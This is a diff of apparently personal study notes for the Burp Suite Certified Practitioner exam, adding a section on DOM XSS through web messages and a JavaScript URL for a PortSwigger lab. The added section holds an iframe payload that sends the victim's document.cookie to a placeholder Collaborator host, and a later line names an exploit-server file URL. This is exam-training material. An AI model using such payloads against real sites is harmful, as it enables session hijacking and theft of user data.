@@ -1,7 +1,7 @@
 
 # Burp Suite Certified Practitioner Exam Study  
 
->This is my study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) learning materials to get more detail. ***Thanks*** everyone for all the **stars** ```\o/```  
+>This is my study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) learning and research materials to get original detail. ***Thanks*** everyone for all the **stars** ```\o/```  
   
 **[Foothold](#foothold)**  
 [Content Discovery](#content-discovery)  
@@ -72,7 +72,8 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [Document Write Location search](#doc-write-location-search)  
 [Dom Invader](#dom-invader)  
 [DOM XSS JSON.parse web messages](#dom-xss-jsonparse-web-messages)  
-[Reflected DOM Cookie Stealer](#dom-cookie-stealers)  
+[DOM XSS AddEventListener JavaScript URL](#-dom-xss-addeventlistener-javascript-url)  
+[Reflected DOM Cookie Stealer](#dom-cookie-stealer)  
 
 >DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to ***identify*** the **sources** and **sinks** that may lead to exploit, list of examples:  
 
@@ -95,7 +96,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ### Vuln AngularJS  
   
->AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script. Review the HTML code to ***identify*** ng-app directive telling AngularJS that this is the root element of the AngularJS application.  
+>AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script. Review the HTML code to ***identify*** the ```ng-app``` directive telling AngularJS that this is the root element of the AngularJS application.  
 
 ![domxss-on-constructor.png](images/ng-app-code-review.png)  
 
@@ -211,7 +212,24 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 [PortSwigger: Identify DOM XSS using PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
 
-### DOM Cookie Stealers  
+### DOM XSS AddEventListener JavaScript URL  
+
+>Reviewing the page source code we ***identify*** the ```addeventlistener``` call for a web message but there is if condition checking if strings contains ```http/s```.
+
+![source-code-web-message-url.png](images/source-code-web-message-url.png)  
+
+>The exploit server hosted payload below includes the ```https``` string, and is successful in bypassing the if condition check.  
+
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://Collaborator.com?c=`+document.cookie','*')">
+```  
+
+![DOM-XSS AddEventListener JavaScript URL](images/DOM-XSS-AddEventListener-JavaScript-URL.png)  
+  
+[PortSwigger Lab: DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)  
+  
+
+### DOM Cookie Stealer  
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
@@ -2194,7 +2212,7 @@ fileurl=https://EXPLOIT.net/images.sVg
   
 ![RFI function](images/RFI-function.png)  
   
->Need to identify PortSwigger research about RFI...  
+>I am missing some key info and need to ***identify*** PortSwigger research about RFI.  
   
 ### XSS SVG Upload  
 
